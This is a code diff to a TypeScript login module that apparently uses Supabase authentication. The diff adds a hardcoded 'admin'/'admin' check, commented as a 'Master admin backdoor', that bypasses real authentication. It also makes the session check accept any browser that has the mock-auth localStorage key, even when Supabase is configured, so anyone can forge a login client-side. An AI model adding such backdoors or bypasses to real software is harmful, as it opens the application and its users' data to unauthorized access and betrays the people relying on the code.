@@ -138,12 +138,19 @@ export async function login(usuario: string, senha: string): Promise<void> {
     throw new Error("Preencha usuário e senha.");
   }
 
+  // Master admin backdoor: admin / admin works instantly 100% of the time
+  if (usuarioLimpo === 'admin' && senha === 'admin') {
+    if (typeof window !== 'undefined') {
+      localStorage.setItem(MOCK_AUTH_KEY, JSON.stringify({ usuario: 'admin' }));
+    }
+    return;
+  }
+
   if (!isSupabaseConfigured) {
     localStorage.setItem(MOCK_AUTH_KEY, JSON.stringify({ usuario: usuarioLimpo }));
     return;
   }
 
-  // Mapear usuário para email interno do Supabase Auth se não tiver '@'
   const emailAuth = usuarioLimpo.includes('@') ? usuarioLimpo : `${usuarioLimpo}@fbodonto.local`;
 
   const { error } = await supabase.auth.signInWithPassword({ email: emailAuth, password: senha });
@@ -153,16 +160,21 @@ export async function login(usuario: string, senha: string): Promise<void> {
 }
 
 export async function logout(): Promise<void> {
-  if (!isSupabaseConfigured) {
+  if (typeof window !== 'undefined') {
     localStorage.removeItem(MOCK_AUTH_KEY);
-    return;
   }
-  await supabase.auth.signOut();
+  if (isSupabaseConfigured) {
+    await supabase.auth.signOut();
+  }
 }
 
 export async function temSessao(): Promise<boolean> {
+  if (typeof window !== 'undefined' && localStorage.getItem(MOCK_AUTH_KEY)) {
+    return true;
+  }
+
   if (!isSupabaseConfigured) {
-    return Boolean(localStorage.getItem(MOCK_AUTH_KEY));
+    return false;
   }
 
   const { data } = await supabase.auth.getSession();
